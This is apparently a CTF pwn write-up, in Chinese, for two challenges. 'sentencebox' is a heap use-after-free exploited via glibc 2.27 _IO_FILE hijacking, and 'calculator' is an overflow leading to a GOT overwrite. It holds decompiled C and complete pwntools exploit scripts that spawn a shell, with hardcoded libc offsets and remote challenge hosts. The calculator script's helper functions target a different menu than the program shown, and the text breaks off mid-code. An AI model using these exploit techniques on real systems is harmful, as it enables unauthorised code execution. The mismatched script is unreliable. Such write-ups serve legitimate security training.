<h2 id="Day1-sentencebox"><a href="#Day1-sentencebox" class="headerlink" title="Day1-sentencebox"></a>Day1-sentencebox</h2><h3 id="程序逻辑-amp-amp-漏洞利用"><a href="#程序逻辑-amp-amp-漏洞利用" class="headerlink" title="程序逻辑 &amp;&amp; 漏洞利用"></a>程序逻辑 &amp;&amp; 漏洞利用</h3><p>菜单题，new/edit/show/delete，其中delete有UAF，输入有check，只能部分字符可以输入，但是注意是先read再做检测，因此我们有一次输入非法字符的机会，之后就exit了，这题当时做的时候想了两种方法，一种是exit退出时候调用的那个函数指针，不过看了下爆破的次数需要的比较多，因此主要做了第二种思路，就是glibc 2.27下的IO_FILE利用。今天看了下东秦的师傅是第一种思路做的，可以参考<a href="https://github.com/neuqcsa/ciscn2020wp/tree/master" target="_blank" rel="noopener">neuqcsa</a>。这里利用ub留下的libc地址，部分写低两个字节到_IO_list_all，改其值为_IO_list_all+8，而后布置fake_io，io的关键check是_flags &amp; 1 != 0以及 _IO_USER_BUF != 0，构造的话,fp+0xe8为system函数地址，fp+0x38为binsh字符串地址，fp+0xd8 = _IO_str_jumps-8。</p>
<p>另外stdout不能改，否则puts会出问题，stderr不能改，因为其fp+0xe8对应到stdout-&gt;read_ptr，在puts的时候会被更新，stdin也无法改，因为两个字节改不到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Check</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = a1;</span><br><span class="line">  v4 = read(<span class="number">0</span>, a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v3;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v3 &gt;= v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (*v5 &lt;= <span class="number">0x60</span> || *v5 &gt; <span class="number">0x7A</span>)</span><br><span class="line">      &amp;&amp; (*v5 &lt;= <span class="number">0x40</span> || *v5 &gt; <span class="number">0x5A</span>)</span><br><span class="line">      &amp;&amp; *v5 != <span class="number">0xA</span></span><br><span class="line">      &amp;&amp; *v5 != <span class="number">0x20</span></span><br><span class="line">      &amp;&amp; *v5 != <span class="number">0x27</span></span><br><span class="line">      &amp;&amp; *v5 != <span class="number">0x21</span></span><br><span class="line">      &amp;&amp; *v5 != <span class="number">0x3F</span></span><br><span class="line">      &amp;&amp; *v5 != <span class="number">0x2E</span></span><br><span class="line">      &amp;&amp; *v5 != <span class="number">0x2C</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"dangerous char found! sentences only!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v3;</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><p>概率大概1/16。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">context.log_level = <span class="string">"info"</span></span><br><span class="line">se      = <span class="keyword">lambda</span> data           :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data     :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data           :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data     :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data     :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>      :p.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims         :p.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data           :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data           :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">itv     = <span class="keyword">lambda</span>                :p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br><span class="line">libc_base = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">"./sentencebox"</span>)</span><br><span class="line"><span class="comment"># p = process('./feedback',env=&#123;'LD_PRELOAD':'./libc-2.23.so'&#125;)</span></span><br><span class="line">    elf = ELF(<span class="string">"./sentencebox"</span>)</span><br><span class="line">    libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"124.70.197.50"</span>,<span class="number">9010</span>)</span><br><span class="line">    elf = ELF(<span class="string">"./sentencebox"</span>)</span><br><span class="line">    libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    sla(<span class="string">"&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"idx: \n"</span>,str(index))</span><br><span class="line">    sla(<span class="string">"size: \n"</span>,str(size))</span><br><span class="line">    sa(<span class="string">"data: \n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    sla(<span class="string">"&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">    sla(<span class="string">"idx: \n"</span>,str(index))</span><br><span class="line">    sa(<span class="string">"data: \n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">"&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">    sla(<span class="string">"idx: \n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">"&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">    sla(<span class="string">"idx: \n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        create(i,<span class="number">0xff</span>,<span class="string">"a"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">        delete(i)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.recv(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))+<span class="number">0x7ffff79e4000</span><span class="number">-0x7ffff7dcfca0</span></span><br><span class="line">    libc_base = libc.address</span><br><span class="line">    success(<span class="string">"libc ==&gt; "</span>+hex(libc.address))</span><br><span class="line">    stdout = libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">    <span class="keyword">return</span> stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">"./sentencebox"</span>)</span><br><span class="line">    stdout = exp()</span><br><span class="line">    libc_base = libc.address</span><br><span class="line">    <span class="keyword">if</span> stdout &amp; <span class="number">0xffff</span> != <span class="number">0x6760</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">"\x5a\x66"</span>)</span><br><span class="line">    static_libc = <span class="number">0x7ffff79e4000</span></span><br><span class="line"></span><br><span class="line">    create(<span class="number">8</span>,<span class="number">0xff</span>,<span class="string">"a"</span>)</span><br><span class="line">    payload = <span class="string">'\x00'</span>*<span class="number">6</span>+p64(libc_base+<span class="number">0x3ec668</span>)+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0x00007ffff7dd07e3</span>-static_libc+libc_base)*<span class="number">4</span>+p64(<span class="number">0x00007ffff7dd07e4</span>-static_libc+libc_base)+p64(<span class="number">0x00007ffff7dd07e3</span>-static_libc+libc_base)+p64(libc.search(<span class="string">"/bin/sh\x00"</span>).next())+p64(<span class="number">0x00007ffff7dd07e4</span>-static_libc+libc_base)</span><br><span class="line">    payload+= p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x00007ffff7dcfa00</span>-static_libc+libc_base)+p64(<span class="number">0x0000000000000001</span>)</span><br><span class="line">    payload+= p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0x000000000a000000</span>)+p64(<span class="number">0x00007ffff7dd18c0</span>-static_libc+libc_base)</span><br><span class="line">    payload+= p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x00007ffff7dcf8c0</span>-static_libc+libc_base)+p64(<span class="number">0x0000000000000000</span>)*<span class="number">6</span></span><br><span class="line">    payload+= p64(libc_base+(<span class="number">0x7f29c5102360</span><span class="number">-0x7f29c4d1a000</span>)<span class="number">-0x8</span>)+p64(<span class="number">0x00007ffff7dd0680</span>-static_libc+libc_base)+p64(libc.sym[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">    gdb.attach(p,<span class="string">'b * 0x400964'</span>)</span><br><span class="line">    create(<span class="number">9</span>,<span class="number">0xff</span>,payload) <span class="comment"># write stdout ,open /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Day2-calculator"><a href="#Day2-calculator" class="headerlink" title="Day2-calculator"></a>Day2-calculator</h2><h3 id="程序逻辑-amp-amp-漏洞利用-1"><a href="#程序逻辑-amp-amp-漏洞利用-1" class="headerlink" title="程序逻辑 &amp;&amp; 漏洞利用"></a>程序逻辑 &amp;&amp; 漏洞利用</h3><p>这题是新华三杯的原题pwn2，程序的开始有个隐蔽的溢出，输入sz=0即可溢出写ptr，利用sscanf可以修改got表，这里改free@got=printf@plt泄露libc，atoi@got改为system，在输入size时get shell。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">main_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v1; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v4; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v8; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v9; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v10; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v11; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v12; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v13; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v14; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v15; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v16; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v17; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v18; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v19; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v20; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> signle_byte; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> v27[<span class="number">56</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v28; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v28 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  bss_ptr2 = <span class="built_in">malloc</span>(<span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the size:"</span>);</span><br><span class="line">  global_sz = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)global_sz &gt; <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The formula is too long!"</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">free</span>(bss_ptr2);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(bss_input_data, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Input the formula:"</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= global_sz - <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      read(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;global_sz + i + <span class="number">4</span>, <span class="number">1u</span>LL);</span><br><span class="line">      <span class="keyword">if</span> ( bss_input_data[i] == <span class="string">'\n'</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        bss_input_data[i] = <span class="number">0</span>;</span><br><span class="line">        global_sz = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ptr_1 = (__int64)ptr;</span><br><span class="line">    ptr2_1 = (__int64)bss_ptr2;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= global_sz - <span class="number">1</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      signle_byte = bss_input_data[j];</span><br><span class="line">      <span class="keyword">if</span> ( signle_byte &gt; <span class="number">0x2F</span> &amp;&amp; signle_byte &lt;= <span class="number">0x39</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( idx &gt; <span class="number">9</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"The number is too long!"</span>);</span><br><span class="line">          <span class="built_in">free</span>(ptr);</span><br><span class="line">          <span class="built_in">free</span>(bss_ptr2);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        v21 = idx++;</span><br><span class="line">        v27[v21] = signle_byte;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !idx )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Lack the number before %c !\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)signle_byte);</span><br><span class="line">          <span class="built_in">free</span>(ptr);</span><br><span class="line">          <span class="built_in">free</span>(bss_ptr2);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        v27[idx] = <span class="number">0</span>;</span><br><span class="line">        __isoc99_sscanf(v27, <span class="string">"%d"</span>, ptr_1);</span><br><span class="line">        ptr_1 += <span class="number">4L</span>L;</span><br><span class="line">        <span class="keyword">if</span> ( signle_byte == <span class="string">'+'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v1 = (_DWORD *)ptr2_1;</span><br><span class="line">          ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">          *v1 = <span class="number">0x20100</span>;</span><br><span class="line">          v23 = <span class="number">0</span>;</span><br><span class="line">          __isoc99_sscanf(<span class="string">"0"</span>, <span class="string">"%c"</span>, &amp;v23);</span><br><span class="line">          v2 = (_DWORD *)ptr2_1;</span><br><span class="line">          ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">          *v2 = v23 + <span class="number">0x30000</span>;</span><br><span class="line">          v3 = (_DWORD *)ptr2_1;</span><br><span class="line">          ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">          *v3 = <span class="number">0x40100</span>;</span><br><span class="line">          v4 = (_DWORD *)ptr2_1;</span><br><span class="line">          ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">          *v4 = <span class="number">0x20000</span>;</span><br><span class="line">          v5 = (_DWORD *)ptr2_1;</span><br><span class="line">          ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">          *v5 = <span class="number">0x10100</span>;</span><br><span class="line">          bss_off = (ptr2_1 - (<span class="keyword">signed</span> __int64)bss_ptr2) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( signle_byte &gt; <span class="string">'+'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( signle_byte == <span class="string">'-'</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v6 = (_DWORD *)ptr2_1;</span><br><span class="line">            ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">            *v6 = <span class="number">0x20100</span>;</span><br><span class="line">            v23 = <span class="number">0</span>;</span><br><span class="line">            __isoc99_sscanf(<span class="string">"0"</span>, <span class="string">"%c"</span>, &amp;v23);</span><br><span class="line">            v7 = (_DWORD *)ptr2_1;</span><br><span class="line">            ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">            *v7 = v23 + <span class="number">0x30000</span>;</span><br><span class="line">            v8 = (_DWORD *)ptr2_1;</span><br><span class="line">            ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">            *v8 = <span class="number">0x50100</span>;</span><br><span class="line">            v9 = (_DWORD *)ptr2_1;</span><br><span class="line">            ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">            *v9 = <span class="number">0x20000</span>;</span><br><span class="line">            v10 = (_DWORD *)ptr2_1;</span><br><span class="line">            ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">            *v10 = <span class="number">0x10100</span>;</span><br><span class="line">            bss_off = (ptr2_1 - (<span class="keyword">signed</span> __int64)bss_ptr2) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( signle_byte != <span class="string">'/'</span> )</span><br><span class="line">            &#123;</span><br><span class="line">LABEL_23:</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"Invalid input %c !"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)signle_byte);</span><br><span class="line">              <span class="built_in">free</span>(ptr);</span><br><span class="line">              <span class="built_in">free</span>(bss_ptr2);</span><br><span class="line">              <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">            &#125;</span><br><span class="line">            v16 = (_DWORD *)ptr2_1;</span><br><span class="line">            ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">            *v16 = <span class="number">0x20100</span>;</span><br><span class="line">            v23 = <span class="number">0</span>;</span><br><span class="line">            __isoc99_sscanf(<span class="string">"0"</span>, <span class="string">"%c"</span>, &amp;v23);</span><br><span class="line">            v17 = (_DWORD *)ptr2_1;</span><br><span class="line">            ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">            *v17 = v23 + <span class="number">0x30000</span>;</span><br><span class="line">            v18 = (_DWORD *)ptr2_1;</span><br><span class="line">            ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">            *v18 = <span class="number">0x60100</span>;</span><br><span class="line">            v19 = (_DWORD *)ptr2_1;</span><br><span class="line">            ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">            *v19 = <span class="number">0x20000</span>;</span><br><span class="line">            v20 = (_DWORD *)ptr2_1;</span><br><span class="line">            ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">            *v20 = <span class="number">0x10100</span>;</span><br><span class="line">            bss_off = (ptr2_1 - (<span class="keyword">signed</span> __int64)bss_ptr2) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( signle_byte != <span class="string">'*'</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">          v11 = (_DWORD *)ptr2_1;</span><br><span class="line">          ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">          *v11 = <span class="number">0x20100</span>;</span><br><span class="line">          v23 = <span class="number">0</span>;</span><br><span class="line">          __isoc99_sscanf(<span class="string">"0"</span>, <span class="string">"%c"</span>, &amp;v23);</span><br><span class="line">          v12 = (_DWORD *)ptr2_1;</span><br><span class="line">          ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">          *v12 = v23 + <span class="number">0x30000</span>;</span><br><span class="line">          v13 = (_DWORD *)ptr2_1;</span><br><span class="line">          ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">          *v13 = <span class="number">0x70100</span>;</span><br><span class="line">          v14 = (_DWORD *)ptr2_1;</span><br><span class="line">          ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">          *v14 = <span class="number">0x20000</span>;</span><br><span class="line">          v15 = (_DWORD *)ptr2_1;</span><br><span class="line">          ptr2_1 += <span class="number">4L</span>L;</span><br><span class="line">          *v15 = <span class="number">0x10100</span>;</span><br><span class="line">          bss_off = (ptr2_1 - (<span class="keyword">signed</span> __int64)bss_ptr2) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        idx = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( idx &lt;= <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( idx )</span><br><span class="line">      &#123;</span><br><span class="line">        v27[idx] = <span class="number">0</span>;</span><br><span class="line">        __isoc99_sscanf(v27, <span class="string">"%d"</span>, ptr_1);</span><br><span class="line">        what();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s = %d\n"</span>, bss_input_data, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_602180);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Lack the last number!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="built_in">free</span>(bss_ptr2);</span><br><span class="line">      result = <span class="number">1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"The last number is too long!"</span>);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="built_in">free</span>(bss_ptr2);</span><br><span class="line">      result = <span class="number">1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> p:p.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> p:p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> p,x:p.recvuntil(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> p,x:p.recvn(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> p,x:p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> p,x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> p,x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> p,x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> p,x,y:p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./calculator'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./calculator'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,name,call)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the size of compary's name"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"please input name:"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">"please input compary call:"</span>)</span><br><span class="line">    p.send(call)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the index:"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the index:"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 